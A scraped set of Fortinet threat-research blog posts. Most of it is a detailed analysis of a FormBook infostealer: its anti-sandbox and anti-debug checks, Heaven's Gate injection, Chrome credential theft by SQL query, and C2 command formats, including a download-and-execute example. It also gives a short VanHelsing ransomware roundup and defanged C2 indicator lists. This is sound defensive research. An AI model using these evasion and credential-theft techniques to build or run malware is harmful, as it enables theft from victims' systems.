Anti-Botnet services  as follows: The relevant C2 server URL is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You cansign upfor future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. URLs hxxps[:]//rushpapers[.]com/ws/ Sha256 F3EB67B8DDAC2732BB8DCC07C0B7BC307F618A0A684520A04CFC817D8D0947B9 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-dumped-malware-without-a-pe-header"
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part II",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the victim’s computerSeverity level:High This is part II of the FormBook analysis blog. In the previous post (Part I), I covered the campaign’s initialization via a phishing email, the CVE-2017-11882 vulnerability it exploited to execute an extracted 64-bit DLL, and the download and decryption of a FormBook variant hidden in a fake PNG file. Finally, I elaborated on how the 64-bit DLL mapped the FormBook payload in a target process (ImagingDevices.exe) and executed it using the process hollowing technique. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In the second part of this analysis, you will learn how the FormBook payload operates on a comprised machine, including the complicated anti-analysis techniques employed by this FormBook variant, how the FormBook leverages Heaven’s Gate and randomly selected processes to evade analysis by cybersecurity researchers, the sensitive data it collects from the victim’s machine, how it communicates with the C2 server, and how it controls the victim’s system with control commands. The FormBook payload is a 32-bit executable that runs inside the 32-bit target process “ImagingDevices.exe”. My analysis reveals that the copied FormBook is re-encrypted. The code initially executed does not belong to the real FormBook but instead serves as a decryption routine. The encrypted data begins at offset 0x6E36C3 (with FormBook loaded at 0x6E0000), and the encrypted data size is hard coded to 0x43600, as illustrated in Figure 1. Next, it calculates the real entry point address from the decrypted code and stores it in the ESI register. This address will be called at the final stage, as shown in Figure 2. FormBook leverages multiple techniques to prevent being analyzed. I explain the main techniques used in this variant below. Figure 4 shows how it calls the ZwOpenDirectoryObject() API (0x2FE3580) inside the duplicated ntdll.dll. In my analysis environment, the original address for the API should be 0x76F43580. This is a module list loaded dynamically by FormBook by their index. Index Module Name 0x1 \"kernel32.dll\" 0x2 \"advapi32.dll\" 0x3 \"ws2_32.dll\" 0x4 \"rstrtmgr.dll\" 0x5 \"sqlite3.dll\" 0x6 \"winsqlite3.dll\" 0x7 \"crypt32.dll\" 0x8 \"vaultcli.dll\" 0x9 \"ole32.dll\" 0xA \"nss3.dll\" 0xB \"user32.dll\" 0xC \"shell32.dll\" FormBook then passes the decrypted module name to a function to load it using a low-level Windows API function, LdrLoadDll(). The desired Windows APIs are not hardcoded strings in FormBook but encrypted hash codes. FormBook traverses the APIs inside the loaded modules and matches their hash codes with the decrypted ones to find the desired APIs. As you can see in Figure 5, the PostThreadMessageW() API was obtained inside the EAX register from the “user32.dll” module. In this variant of FormBook, more than 100 key functions are encrypted by default and are decrypted only before calling. They are then re-encrypted after calling, which presents a challenge for static analysis. As shown on the left side of Figure 6, the SearchDecryptCode() function is called to search the encrypted code by locating the given start magic (6 bytes) and end magic (6 bytes). It then decrypts the located code. At 0x709B15, it calls sub_70DC33(), whose body is shown on the right side. The instructions enclosed by the red rectangle were just decrypted. After executing the dynamic function (sub_70DC33()), it calls ReEncryptCode(), at 0x709B26, to re-encrypt the function. To protect FormBook from being analyzed by auto-analysis platforms, it performs multiple detections. 1. Virtual Machines and Analysis Tools FormBook contains a predefined blacklist of encrypted hash codes, which are generated from process names associated with popular VM platforms or analysis tools, such as VMware (vmwareuser.exe, vmwareservice.exe), Sandboxie (sandboxiedcomlaunch.exe, sandboxierpcss.exe), Sysinternals tools (procmon.exe, regmon.exe, filemon.exe), network sniffers (wireshark.exe, netmon.exe), automation scripts (python.exe, perl.exe), and more. It retrieves all active processes from the victim’s system, generates a hash code from their process names, and compares them with a predefined set of blacklisted hash codes. The following code snippet demonstrates how it decrypts a hash code from 0x72FE2A27, which is 0x3EBE9086 generated from “vmwareuser.exe”. …… 006F642Aleaecx, [ebp+Dest]; Current process name. 006F6430pushecx 006F6431push3Ah; Decryption key. 006F6433push72FE2A27h; Encrypted hash code. 006F6438calldecrypt_fun; Decrypts a hash code. 006F643Daddesp, 8 006F6440pusheax; EAX holds the decrypted hash code, 0x3EBE9086, which is generated from “vmwareuser.exe”. 006F6441callmatch_hashcode; Compares with the current process. 006F6446addesp, 8 006F6449testeax, eax 006F644Bjnzanalysis_detected …… Once matched, it sets a global flag indicating it’s running in an analysis environment. 2. Detecting Sandbox Environments Some auto-analysis sandboxes run the target process from specific folders. FormBook detects this by retrieving the full path of the target process it hollowed into. In my analysis machine, it’s: “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe”. It then checks if the parent folder contains keywords from a blacklist by matching their hash codes. Examples include: “\\cuckoo\\”, “\\sandcastle\\”, “\\aswsnx\\”, “\\sandbox\\”, “\\smpdir\\”, “\\samroot\\”, and “\\avctestsuite\\” Below is an example of full path triggers detection: “C:\\cuckoo\\Windows Photo Viewer\\ImagingDevices.exe” 3. Windows Account Name It calls the Windows API RtlQueryEnvironmentVariable_U() with “USERNAME” as the variable name to retrieve the victim’s username. Figure 7 demonstrates the retrieved username after calling the API. It then generates a hash code from the username and compares it with those in a blacklist. FormBook assumes the usernames starting with certain patterns (e.g., “cuckoo”, “sandbox-“, “nmsdbox-“, and more) belong to auto-analysis systems. All of the above detection results are stored in global flags. FormBook checks these flags in a function and exits the process if any of them is set. It checks if a kernel-mode debugger (like Windbg) is enabled by calling the API NtQuerySystemInformation() with SystemKernelDebuggerInformation(0x23) system information class. Refer to Figure 8 for more details. If the KernelDebuggerEnabled is 1, it means a kernel debugger is present. It also determines if the user-mode debugger is present by passing ProcessDebugPort (0x7) as a ProcessInformationClass parameter to the ZwQueryInformationProcess() API. It returns 0xFFFFFFFF if a user-mode debugger is attached, such as x32dbg, which I used during the analysis. The Heaven’s Gate technique is a mechanism on Windows x64 systems that allows switching from 32-bit to 64-bit code inside a 32-bit process. It is also known as WoW64 (Windows-on-Windows 64-bit). This transition is the essence of “Heaven’s Gate.” The mechanism presents a significant challenge to cybersecurity researchers because a 32-bit debugger cannot debug 64-bit code, interrupting the debugging process. The Windows x64 architecture determines the execution mode based on the CS (Code Segment) register. In user mode (ring 3), 0x23 corresponds to the 32-bit code segment, while 0x33 corresponds to the 64-bit code segment. Executing an instruction like “jmp far 0x33:{address}” in a 32-bit process switches to 64-bit mode and executes 64-bit code from the {address}. This variant of FormBook uses the Heaven’s Gate technique multiple times, which will be explained in the following sections. FormBook randomly selects one of the explorer.exe child processes from active processes and leverages the Heaven’s Gate technique to manipulate the selected process. The malware first calls the NtQuerySystemInformation() API with the SystemProcessInformation (0x5) parameter to enumerate all active processes. It locates the PID (Process ID) of explorer.exe by comparing process name hash codes. Next, it scans the active processes to randomly choose a child process of explorer.exe by matching the active processes’ PPID (Parent Process ID) with the explorer.exe’s PID (Figure 9). After obtaining the process handle of the selected process (e.g., notepad.exe) by calling the NtOpenProcess() API, FormBook creates a shared memory between the two processes and copies the shellcode: It then utilizes the Heaven’s Gate technique to execute a piece of 64-bit code that had been copied and deployed in a newly allocated buffer. Figure 10 is about to execute “jmp far 33:2F30000”, where 0x33 is the new CS and 0x2F30000 is the new buffer’s address with the copied 64-bit code, as shown in the memory. Upon completion, it returns to 23:7107C0, which has already been pushed onto the top of the stack. My analysis reveals that the 64-bit code takes control of the selected process’s main thread (like notepad.exe) to execute a piece of injected malicious code. To control the selected process, it calls the NtOpenProcess() and ZwQueryInformationProcess() APIs to retrieve the process’ details. The APIs ZwOpenThread() and ZwSuspendThread() are called to pass the selected process’ information to suspend the main thread inside the selected process. In Figure 11, we can see that the 64-bit code just called ZwSuspendThread(), and in another debugger attached to the chosen process, it displays the suspended main thread. Subsequently, the 64-bit code copies the malicious payload into the selected process over the shared memory. It then calls NtGetContextThread() and NtSetContextThread() to modify the RIP register, redirecting the execution to the injected code. Finally, it calls the NtResumeThread() API to resume the main thread, causing the malicious code to run inside the selected process, notepad.exe. Execution then returns to the 32-bit code by executing a “retf” instruction. This time, the selected child process of explorer.exe is a Notepad.exe with the PID 9560. The copied malicious code is the same as the 64-bit code mentioned earlier, but it goes down different code branches depending on a returned flag. Twelve encrypted process names are saved in local variables, which can be obtained using a function with a string index. The table below lists all the processes and indexes. String Index Process Names 0x0 \"PATHPING.EXE\" 0x1 \"fontview.exe\" 0x2 \"MuiUnattend.exe\" 0x3 \"forfiles.exe\" 0x4 \"chkntfs.exe\" 0x5 \"find.exe\" 0x6 \"DpiScaling.exe\" 0x7 \"waitfor.exe\" 0x8 \"net.exe\" 0x9 \"icsunattend.exe\" 0xa \"cttune.exe\" 0xb \"whoami.exe\" These 32-bit processes all reside in the “C:\\Windows\\SysWOW64\\” folder. FormBook repeatedly launches these processes in a loop until one is successfully created. It then performs process hollowing on the process, injects the FormBook payload into the process (such as “PATHPING.EXE”), and executes it. As shown in Figure 12, it is about to call the CreateProcessInternalW() API to create a PATHPING.EXE process, with the dwCreationFlags parameter set to 0x800000C, indicating a suspended process will be created. It then creates a shared memory section between notepad.exe and PATHPING.EXE. At this point, the task of the code running in the selected process (notepad.exe) is completed. Switching to the target process (ImagingDevices.exe), it returns to the 32-bit code mode from the 64-bit code via Heaven’s Gate. It brings the full process information of the newly created PATHPING.EXE process using the shared memory established between it and the selected notepad.exe process. ImagingDevices.exe takes control of the PATHPING.EXE process and copies the FormBook payload into the PATHPING.EXE process via the shared memory section. As shown in Figure 14, the payload is encrypted and mapped into both processes’ memory, having been written by code running inside ImagingDevices.exe. Next, ImagingDevices.exe calls the NtSetContextThread() API to modify the PATHPING.EXE’s EAX register (which holds a thread function address to RtlUserThreadStart().) to redirect the execution to a specific function. This function decrypts the FormBook payload and calls the entry point function of the FormBook payload once the NtResumeThread() API is called. After employing numerous evasion techniques, FormBook finally hits the main payload within the PATHPING.EXE process, another 32-bit process. Based on my analysis, this process function acts as a dashboard program for FormBook. It gathers sensitive data from the victim’s system and manipulates another selected process to communicate with its C2 server. FormBook collects basic information from the victim’s device, such as the Windows product name, the current build, the username, and the computer name. Some are obtained from the system registry via API calls, while others are retrieved using the RtlQueryEnvironmentVariable_U() API. This information is then encrypted and saved in a global variable, which is later sent to the C2 server in an HTTP GET packet to register the infected system. As shown in Figure 15, the malware prepares to encrypt the collected basic information, where “XLNG…” is a magic string, “Windows 10 Enterprise x64” is the Windows product information, followed by the Base64-encoded computer name and user name. FormBook then randomly selects another child process of explorer.exe. Similar to what was done in the ImagingDevices.exe process, it invokes 64-bit code from the 32-bit process using the Heaven’s Gate technique. This 64-bit code copies and deploys the FormBook into the newly selected process (e.g., another notepad.exe process) and modifies the RIP register to point to the deployed FormBook at a different entry point. According to my analysis, this newly selected process acts as a socket process responsible for communicating with the C2 server. A large shared memory section is created and mapped into PATHING.EXE and the chosen data exchange process. When it returns to 32-bit mode (using Heaven’s Gate) in the PATHPING.EXE process, FormBook calls the PostThreadMessageW() API with a Msg parameter of 0x111 (WM_COMMAND) to send a message to the main thread of the selected process (like notepad.exe), as shown in Figure 16. Instead of calling NtResumeThread() to resume thread execution, FormBook sends a Windows message to activate the payload. Why does it send a message to run the FormBook as a socket process? As we know, most Windows programs are driven by Windows messages. Most of the time, a program remains idle because the message queue is empty—there is no user interaction (mouse, keyboard, etc.), system events, or other messages. The program waits (blocked by the NtUserGetMessage() API) until a new message arrives. If FormBook modifies the value of the RIP register to point to the copied FormBook payload and then proactively sends a message to the process, it can then hijack the original execution flow and redirect it to run the FormBook payload instead. The FormBook instance in PATHPING.EXE also acts as a daemon, monitoring the socket process. Once the victim terminates the socket process, FormBook immediately selects another child process of explorer.exe to take its place. The FormBook instance running in PATHPING.EXE harvests sensitive data from the compromised system, such as saved credentials of various software, autofill data, cookies, proxy settings for browsers, and data from the system clipboard. FormBook can also obtain sensitive data from multiple resources, such as the system registry and the local profile files. For example, it extracts the autofill data for the IE browser from the key path “HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” in the system registry. It also collects email account information from Outlook by scanning the following key paths in the system registry to cover multiple Outlook versions: When gathering sensitive data from Chrome, FormBook accesses some SQLite database format files located in “%LocalData%\\Google\\Chrome\\User Data\\Login Data\\Default\\”, explicitly targeting these files: “Login Data” (credentials), “Cookies” (web site cookies), “Web Data” (autofill), and “Network” (proxy setting). This is accomplished through a series of winsqlite3.dll API calls, including sqlite3_open(), sqlite3_prepare_v2(), sqlite3_step(), sqlite3_column_text(), sqlite3_column_blob(), sqlite3_column_bytes(), and sqlite3_close(). Figure 17 demonstrates Chrome credential extraction, showing FormBook executing the SQL query “SELECT origin_url, username_value, password_value FROM logins” via the sqlite3_prepare_v2() API. The sample credentials, shown at the bottom, were just obtained from a Chrome browser in a test environment. The malware maintains the capability to collect similar sensitive data from a wide range of additional applications. Below are the categorized software applications from which FormBook can collect sensitive data: Email Clients: Outlook, Thunderbird, and Foxmail. Web Browsers: Internet Explorer, Chrome, Firefox, Edge, Brave-Browser, Opera Neon, ChromePlus, Avast Secure Browser, Yandex Browser, Citrio, Sleipnir 5, Epic Privacy Browser, Elements Browser, 360 Chrome, CCleaner Browser, Sputnik, Cốc Cốc Browser, Opera, Uran, Coowon Browser, Comodo Dragon, AVG Secure Browser, CentBrowser, 7Star Browser, UR Browser, SalamWeb, QIP Surf, Chromium, Iridium Browser, Slimjet, Vivaldi, Orbitum, Liebao, Kometa Browser, Chedot, Torch Browser, Amigo, Kinza, and Blisk, Let’s now examine the socket process (another selected process, like notepad.exe) that handles communication with the Command-and-Control (C2) server in the background. The C2 domain list in this variant of FormBook is not stored in plaintext. Instead, it undergoes a multi-layered obfuscation process. Each domain is encrypted, encoded using Base64, and then encrypted again. This technique adds significant complexity to static analysis and helps evade detection. This variant has 64 C2 domains, which are dynamically retrieved in the socket process by referencing a one-byte index. The decrypted domains only exist temporarily in memory during runtime, making them more elusive. For the complete list of C2 domains, refer to the IOCs section at the end of this report. Figure 18 shows the socket process after successfully decrypting a C2 server domain from memory. The decrypted domain is “www[.]manicure-nano[.]sbs,” corresponding to index 0x2B, with the associated URL “/xkx8/”. A shared memory section is created between PATHPING.EXE and the socket process (like notepad.exe), which is used to share: Another responsibility of the socket process is to gather system clipboard data. FormBook performs this by running a thread calling the relevant APIs: OpenClipboard(), GetClipboardData(), GlobalLock(), GlobalUnlock(), and CloseClipboard(). The collected clipboard data is also stored in shared memory. Within the socket process, FormBook starts a specific thread to repeatedly check if a flag is set by PATHPING.EXE that tells if the collected data is ready to send. Once the flag is triggered, FormBook transmits the collected data using HTTP GET and POST. Based on my analysis, basic system information is sent via GET, and other data is sent via POST. As shown in Figure 19, execution breaks at a function call (located at 0x1F08625B1D1) that is responsible for encrypting collected credentials—retrieved from Mozilla Firefox in this instance—in the memory dump before sending them to the C2 server. To evade detection during transmission, FormBook encrypts and encodes the data before sending it out. Each C2 server has its own unique 0x14-byte-long encryption key seed hardcoded in memory. The data undergoes two layers of encryption. It first uses a common predefined key to encrypt the data, then uses the C2 server’s own encryption key to encrypt it again. After this double encryption, FormBook encodes the data using the standard base64 algorithm. Figure 20 shows a screenshot of an HTTP Post packet in Wireshark, illustrating how FormBook sends collected data to a C2 server. The URL in this case is www[.]grcgrg[.]net/jxyu/. The encrypted data is located in the body portion of the POST request, prefixed with a randomly generated string, “30J0cVz=”. As mentioned before, when the socket process receives a command packet from the C2 server, it saves it in shared memory and sets a corresponding flag. This informs the FormBook instance running in the PATHPING.EXE to process the C2 command. All incoming packets from the C2 server are multi-layer encrypted and Base64-encoded. Once received, the PATHPING.EXE instance decrypts and decodes the packets before interpretation. A decrypted packet format looks like this: “XLNG{command ID}{command data}{XLNG}” FormBook Control Commands: 1.     ‘1’ – 0x31: This command delivers three kinds of executable files within the packet: *.dll, *.ps1, and *.exe. Once this command is received, FormBook saves the file into the system %temp% directory and then executes it on the victim’s system. 2.     ‘2’ – 0x32: This command can be used to update the FormBook or execute other malware. FormBook receives a 32-bit EXE file in the packet and saves it into a randomly generated temp file within the system. After that, it executes the EXE file by invoking the CreateProcessInternalW() API. As shown in Figure 21, it just wrote the 32-bit EXE data into a temp file, such as “%temp%\\yzbtfb3.exe.” It finally calls ExitProcess() to exit the current FormBook process (PATHPING.EXE). 3.     ‘3’ – 0x33: This command is used to remove FormBook from the victim’s system. It deletes Formbook's file and Auto-run items from the system registry and exits the current FormBook instance. It also restarts the Explorer.exe process. 4.     ‘4’ – 0x34: When FormBook receives this command, it downloads an executable file from a given URL that comes with the packet if a subcommand is provided. Otherwise, it only executes a given command. This variant of FormBook provides two sub-commands: Below are three cases that demonstrate how the ‘4’ command works. Without sub-command: XLNG4cmd.exeXLNG RMTD sub-command: XLNG4RMTD:http://test.com/test.exeXLNG RMTU sub-command: XLNG4RMTU:http://test.com/test.ps1XLNG FormBook downloads the file into a randomly named file under the system’s %temp% folder. It calls a series of APIs to do so, such as InternetOpenW(), InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), InternetQueryDataAvailable(), and InternetReadFile(). Finally, FormBook calls ShellExecuteA to execute the downloaded file in the compromised system. If no sub-commend is provided in the command data, it means the command data is not a URL, which can be executed directly by calling the ShellExecuteA() API. Figure 22 provides an example with a simulated control command packet, which was about to call an API to launch “C:\\Windows\\system32\\mspaint.exe”. 5.     ‘5’ – 0x35: This command allows FormBook to clean sensitive data saved on the victim's browsers, such as cookies, credentials, and more. It also deletes some folders and files from the compromised system by calling the SHFileOperationW() API. The affected paths are: • \"%WinDir%\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\\Low\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\\Low\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cookies\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Current Session\"• \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\{ProfileName}\\Cookies.sqlite\" 6.     ‘6’ – 0x36: This command instructs FormBook to collect sensitive data that will be sent to the C2 server, as explained in the “Collect Sensitive Data” section above. 7.     ‘7’ – 0x37: Reboots the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_REBOOT parameter to reboot the system. 8.     ‘8’ – 0x38: Powers off the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_POWEROFF parameter to power off the system. 9.     ‘9’ – 0x39: In this variant, the command corresponds to an empty function. In this second part of the FormBook blog series, I explained how the FormBook payload operates within the 32-bit target process, “ImagingDevices.exe.” Figure 23 provides an overview of the entire workflow executed by the payload. I also showed the various complicated anti-analysis techniques used by this FormBook variant, including—but not limited to—a hidden ntdll.dll module, API obfuscation, more than 100 encrypted key functions, anti-sandbox techniques, anti-debugging, and the repeated use of Heaven’s Gate techniques. I then explained how FormBook randomly selects a process from active processes and takes control of it using the Heaven’s Gate technique. Its main objective is to perform process hollowing on the selected process (say PATHPING.EXE), inject FormBook into the process, and execute it as a dashboard. Once running, FormBook collects a wide range of sensitive data from the victim’s system, including, but not limited to, basic system information, saved credentials, cookie data, autofill data, browser history, and more. Next, I described how the C2 server list in this FormBook variant is decrypted and decoded, and how stolen sensitive data is formatted and transmitted in network packets. Finally, I examined FormBook’s nine control commands, which enable a wide array of capabilities, such as executing provided executable files, launching an existing file, downloading and executing EXE, DLL, and PS1 files, and remotely rebooting or shutting down the victim’s machine. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for accessing FormBook’s C2 server. The C2 server list is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You can sign up to receive future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://www[.]arwintarim[.]xyz/shoy/hxxp://www[.]promutuus[.]xyz/bpae/hxxp://www[.]218735[.]bid/3f5o/hxxp://www[.]vivamente[.]shop/xr41/hxxp://www[.]segurooshop[.]shop/wcz8/hxxp://www[.]hugeblockchain[.]xyz/1dpy/hxxp://www[.]crazymeme[.]xyz/78bm/hxxp://www[.]extremedoge[.]xyz/372c/hxxp://www[.]685648[.]wang/3k4m/hxxp://www[.]shibfestival[.]xyz/8538/hxxp://www[.]promoconfortbaby[.]store/1pxl/hxxp://www[.]balivegasbaru2[.]xyz/cfze/hxxp://www[.]themutznuts[.]xyz/ks15/hxxp://www[.]kpilal[.]info/9o26/hxxp://www[.]dogeeditor[.]xyz/x5dz/hxxp://www[.]adjokctp[.]icu/3ya5/hxxp://www[.]kasun[.]wtf/u4ue/hxxp://www[.]031235246[.]xyz/ml07/hxxp://www[.]intention[.]digital/h6z3/hxxp://www[.]prepaidbitcoin[.]xyz/rcx4/hxxp://www[.]ddvids[.]xyz/uiki/hxxp://www[.]zhuanphysical[.]shop/zcro/hxxp://www[.]theweb[.]services/fb40/hxxp://www[.]sdwd[.]wang/sfv4/hxxp://www[.]lucynoel6465[.]shop/1i64/hxxp://www[.]nhc7tdkp6[.]live/d9kr/hxxp://www[.]ciptaan[.]xyz/fjwa/hxxp://www[.]gluconolmx[.]shop/8370/hxxp://www[.]shlomi[.]app/5nwk/hxxp://www[.]garfo[.]xyz/35rt/hxxp://www[.]caral[.]tokyo/plub/hxxp://www[.]meritking[.]cloud/gakd/hxxp://www[.]grcgrg[.]net/jxyu/hxxp://www[.]nullus[.]xyz/pf7y/hxxp://www[.]actionlow[.]live/0a0g/hxxp://www[.]dangky88kfree[.]online/11lg/hxxp://www[.]szty13[.]vip/abhi/hxxp://www[.]arryongro-nambe[.]live/h108/hxxp://www[.]dqvcbn[.]info/iby8/hxxp://www[.]svapo-discount[.]net/s956/hxxp://www[.]yueolt[.]shop/je6k/hxxp://www[.]sigaque[.]today/u2nq/hxxp://www[.]manicure-nano[.]sbs/xkx8/hxxp://www[.]laohuc58[.]net/zyjq/hxxp://www[.]iighpb[.]bid/jfhd/hxxp://www[.]fjlgyc[.]info/txra/hxxp://www[.]sbualdwhryi[.]info/dbdy/hxxp://www[.]xrrkkv[.]info/eg97/hxxp://www[.]08081[.]pink/2wr9/hxxp://www[.]jyc11[.]top/xz2s/hxxp://www[.]kdjsswzx[.]club/h3ut/hxxp://www[.]gnlokn[.]info/lmor/hxxp://www[.]btbjpu[.]info/pjhe/hxxp://www[.]bellysweep[.]net/gr1r/hxxp://www[.]dilgxp[.]info/7qht/hxxp://www[.]leveledge[.]sbs/asbs/hxxp://www[.]ethereumpartner[.]xyz/xou3/hxxp://www[.]choujiezhibo[.]net/pu7t/hxxp://www[.]domuss[.]asia/yf4f/hxxp://www[.]seasay[.]xyz/xwy3/hxxp://www[.]tumbetgirislinki[.]fit/i8hk/hxxp://www[.]ef4refef[.]sbs/f88b/hxxp://www[.]aicycling[.]pro/4m7q/hxxp://www[.]autonomousrich[.]xyz/iej0/ malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign"
  },
  {
    "title": "Ransomware Roundup – VanHelsing",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the VanHelsing ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands a ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the VanHelsing ransomware was made available on a publicly available file-scanning site in mid-March 2025. Like other ransomware attacks, VanHelsing demands a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the VanHelsing ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the VanHelsing ransomware (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) takes the following command line arguments: The VanHelsing ransomware then encrypts files on the compromised machines and adds the file extension “.vanlocker” to affected files. Note that although this VanHelsing variant (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) uses “.vanlocker” as its extension, it still belongs to the VanHelsing ransomware family because it uses the same ransom negotiation and data leak sites as another VanHelsing variant. (SHA2: 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17) This other variant adds a “.vanhelsing” file extension to the files it encrypts. The VanHelsing ransomware exempts the following files: boot.ini autofun.inf bootfont.bin bootsect.bak desktop.ini ntldr ntuser.dat ntuser.dat.log ntuser.ini thumb.db GDIPFONTCACHEV1.DAT iconcache.db d3d9caps.dat LOGS.txt README.txt It also avoids encrypting files with the following file extensions: .vanlocker .exe .dll .lnk .sys .msi .bat .bin .com .cmd .386 .adv .ani .cab .ico .mod .msstyles .msu .nomedia .ps1 .rtp .syss .deskthemepack .cur .cpl .diagcab .diagcfg .diagpke .dll .drv .hlp .pdb .hta .key .lock .ldf .ocx .icl .icns .ics .idx .mod .mpa .msc .msp .nls .rom .scr .shs .spl .theme .thempa .wpx The VanHelsing ransomware avoids encrypting files in the following folders: tmp wiint temp thumb $Recycle.Bin $RECYCLE.BIN System Volume Information boot Windows Trend Micro program files program files(x86) tor browser Windows intel all users msocache perflogs default microsoft It also creates the following mutex: It may also modify the registry key Software\\Classes\\.vanlocker\\DefaultIcon to use a custom icon for .VANLOCKER files. However, we did not observe this VanHelsing ransomware sample change the file icon of the encrypted files in our testing. It then drops the following ransom note in “README.txt”: The ransom note directs victims to chat sites operated by the attacker on TOR, where ransom negotiation takes place. The ransomware also replaces the desktop wallpaper with its own. The VanHelsing ransomware operates a TOR site where the group posts the information it has stolen from its victims. At the time of our initial investigation in late March 2025, six victims were on the data leak site, and they had added one more victim when we checked back in mid-April. Our analysis of the VanHelsing ransomware victims listed on the data leak site found: Note that victims who have paid the ransom may have been removed from the data leak site. As such, additional companies may have been affected by the VanHelsing ransomware. The VanHelsing ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. VanHelsing Ransomware File IOCs SHA2 Note 